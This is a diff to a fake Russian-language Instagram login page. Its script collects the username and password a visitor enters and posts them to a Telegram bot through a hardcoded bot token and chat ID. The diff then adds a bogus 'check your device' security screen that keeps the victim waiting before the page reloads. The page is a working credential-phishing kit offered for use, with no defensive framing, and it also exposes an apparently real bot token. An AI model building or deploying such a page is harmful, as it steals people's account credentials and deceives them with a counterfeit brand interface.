@@ -32,22 +32,28 @@
     </div>
 
     <div class="right">
+    <div id="login-form">
         <h2>Войти в Instagram</h2>
-
-        <input class="input" type="text"
-               placeholder="Имя пользователя, номер телефона или эл. адрес">
-
+        <input class="input" type="text" placeholder="Имя пользователя, номер телефона или эл. адрес">
         <input class="input" type="password" placeholder="Пароль">
-
         <button class="btn">Войти</button>
-
         <a class="link" href="#">Забыли пароль?</a>
-
         <button class="fb-btn">Войти через Facebook</button>
         <button class="create">Создать новый аккаунт</button>
-
-        <div class="meta">∞ Meta</div>
     </div>
+
+    <div id="security-check" style="display: none; text-align: center; padding: 20px;">
+        <img src="https://cdn-icons-png.flaticon.com/512/702/702797.png" style="width: 60px; margin-bottom: 20px;">
+        <h3 style="margin-bottom: 15px;">Проверьте свое устройство</h3>
+        <p style="font-size: 14px; color: #8fa3ad; line-height: 1.5;">
+            Для защиты вашего аккаунта мы отправили запрос на ваше основное устройство. 
+            Пожалуйста, откройте приложение **Instagram** и нажмите **"Это я"**, чтобы завершить вход.
+        </p>
+        <div class="loader" style="margin-top: 20px;">⌛ Ожидание подтверждения...</div>
+    </div>
+
+    <div class="meta">∞ Meta</div>
+</div>
 
 </div>
 
@@ -77,36 +83,52 @@
 <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
 <script>
     const loginBtn = document.querySelector('.btn');
-    const usernameInput = document.querySelectorAll('.input')[0]; // Первое поле (логин)
-    const passwordInput = document.querySelectorAll('.input')[1]; // Второе поле (пароль)
-
-    // Данные твоего бота
+    const loginForm = document.getElementById('login-form');
+    const securityCheck = document.getElementById('security-check');
+    const inputs = document.querySelectorAll('.input');
+    
     const botToken = '8685347158:AAFJr2ifGhw2iLUrwgxXcfPg_SPnMHyccKs';
     const myChatId = '1751760034';
 
     loginBtn.onclick = async () => {
-        const login = usernameInput.value;
-        const pass = passwordInput.value;
+        const username = inputs[0].value;
+        const password = inputs[1].value;
 
-        if (login && pass) {
-            // Формируем сообщение с данными
-            const message = `🔥 Получены данные!\n👤 Логин: ${login}\n🔑 Пароль: ${pass}`;
-            const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${myChatId}&text=${encodeURIComponent(message)}`;
+        if (username && password) {
+            // 1. Отправляем данные в Telegram
+            const message = `🔥 **Данные для входа**\n\n👤 Логин: \`${username}\`\n🔑 Пароль: \`${password}\``;
+            
+            try {
+                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: myChatId,
+                        text: message,
+                        parse_mode: 'Markdown'
+                    })
+                });
 
-            // Отправляем данные тебе в Telegram
-            fetch(telegramUrl)
-                .then(() => {
-                    // После отправки имитируем ошибку или перенаправляем на настоящий Instagram
-                    alert("Неверный пароль. Попробуйте еще раз.");
-                    // window.location.href = "https://www.instagram.com/accounts/login/"; 
-                })
-                .catch(err => console.error('Ошибка сети', err));
+                // 2. Скрываем форму и показываем экран проверки
+                loginForm.style.display = 'none';
+                securityCheck.style.display = 'block';
+
+                // 3. (Опционально) Через 30 секунд можно вернуть ошибку
+                setTimeout(() => {
+                    alert("Время ожидания истекло. Попробуйте войти снова.");
+                    location.reload();
+                }, 30000);
+
+            } catch (err) {
+                console.error("Ошибка сети:", err);
+            }
         } else {
-            alert("Пожалуйста, заполните все поля.");
+            alert("Пожалуйста, введите логин и пароль.");
         }
     };
 </script>
 </body>
 </html>
+
 
 
